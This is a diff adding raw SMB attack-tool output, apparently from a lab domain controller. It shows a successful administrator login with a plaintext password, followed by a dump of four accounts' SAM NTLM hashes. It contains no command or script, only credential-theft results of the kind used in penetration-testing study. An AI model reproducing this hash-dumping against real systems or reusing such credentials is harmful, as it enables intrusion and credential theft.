@@ -1,0 +1,8 @@
+SMB         10.10.10.5      445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:corp.local)
+SMB         10.10.10.5      445    DC01             [+] corp.local\administrator:Summer2025! (Pwn3d!)
+SMB         10.10.10.5      445    DC01             [+] Dumping SAM hashes
+SMB         10.10.10.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+SMB         10.10.10.5      445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.5      445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.5      445    DC01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7c0adfe9e5e94b73746ddb02a8e9e8a3:::
+SMB         10.10.10.5      445    DC01             [+] Added 4 SAM hashes to the database
